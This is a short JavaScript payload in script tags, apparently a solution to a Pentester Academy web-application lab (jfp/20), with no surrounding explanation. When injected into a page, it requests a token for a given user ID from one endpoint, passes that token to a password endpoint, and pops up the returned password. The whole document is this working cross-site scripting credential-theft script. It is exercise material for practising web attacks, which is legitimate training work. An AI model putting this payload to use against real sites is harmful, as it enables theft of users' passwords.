<script>
// http://pentesteracademylab.appspot.com/lab/webapp/jfp/20
var r1 = new XMLHttpRequest();

r1.onreadystatechange = function() {
  if (r1.readyState === 4 && (r1.status === 200)) {
    var items = JSON.parse(r1.responseText);
    tokenid = items["params"].token;

    var r2 = new XMLHttpRequest();
    r2.onreadystatechange = function() {
      if (r2.readyState === 4 && r2.status === 200) {
        var newitems = JSON.parse(r2.responseText);
        pass = newitems["resp"].password;
        alert(pass);
      }
    }
    r2.open('GET', '/lab/webapp/jfp/20/getpassword?token=' + tokenid);
    r2.send();
  }
}
r1.open('GET', '/lab/webapp/jfp/20/gettoken?uid=3476');
r1.send();

</script>
